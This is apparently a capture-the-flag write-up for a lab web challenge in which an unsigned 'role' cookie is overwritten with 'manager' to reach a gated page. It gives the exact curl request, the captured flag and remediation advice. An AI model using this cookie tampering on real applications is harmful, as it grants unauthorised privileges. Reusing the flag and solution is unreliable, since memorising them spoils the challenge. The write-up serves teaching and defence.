# ExpenseFlow - unsigned role cookie (client-side privilege)

| | |
|---|---|
| **Challenge** | ExpenseFlow |
| **Category** | AUTH |
| **Points / Difficulty** | 100 / easy |
| **Target** | http://auth4.chal.deti:8063 |
| **Auth weakness** | CWE-602 - client-side enforcement of server-side security |
| **Creds given** | employee / employee123 |

## Hint
> The page hides a door your browser alone decides - edit the lock's note.

## Recon
Logging in as `employee` sets **two** cookies:

| Cookie | Value | Notes |
|--------|-------|-------|
| `session` | `eyJ1c2VyIjoiZW1wbG95ZWUifQ.avPdqA.…` | Flask-**signed**; first segment base64-decodes to `{"user":"employee"}` |
| `role` | `employee` | plaintext, **unsigned**, separate cookie |

The gated page `/manager` decides access from the standalone `role` cookie.

## Approach
CWE-602: the privilege check happens client-side - the server trusts the
`role` cookie, which the browser controls. They signed the *identity*
(`session` → `user=employee`) but left the *privilege* in an unsigned cookie.
Keep the valid signed session, overwrite `role` with the value the `/manager`
page expects. `admin` was rejected; the matching role is **`manager`**.

## Exploitation - the exact request
```bash
curl -s -b 'session=eyJ1c2VyIjoiZW1wbG95ZWUifQ.avPdqA.YznWYqn8ti15qPPQDk3nxSXqvBg; role=manager' \
     http://auth4.chal.deti:8063/manager | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{98ceea7ed18edfae9b5b37f18db00c62}
```

## Root cause & remediation
- **Cause:** authorization is enforced with an unsigned, client-controlled
  `role` cookie (CWE-602). Signing only the identity while leaving the role
  tamperable lets any employee self-promote to manager.
- **Fix:** derive the role server-side from the authenticated identity (look it
  up from the signed session / DB on each request); never trust a
  client-supplied role. If a role must live in a cookie, put it inside the
  signed session payload so tampering invalidates the signature.
